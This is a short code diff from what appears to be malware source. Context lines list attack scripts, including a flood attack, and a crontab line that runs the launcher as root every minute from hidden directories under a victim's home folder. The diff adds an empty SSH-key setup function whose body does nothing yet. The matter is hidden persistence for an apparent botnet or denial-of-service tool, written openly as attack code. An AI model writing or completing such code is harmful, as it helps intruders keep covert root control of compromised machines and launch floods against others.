@@ -7,6 +7,10 @@ attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
 attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )'
 
 
+def set_ssh_key():
+    os.system('')
+
+
 def set_up_crontab():
 
     # Write Crontab
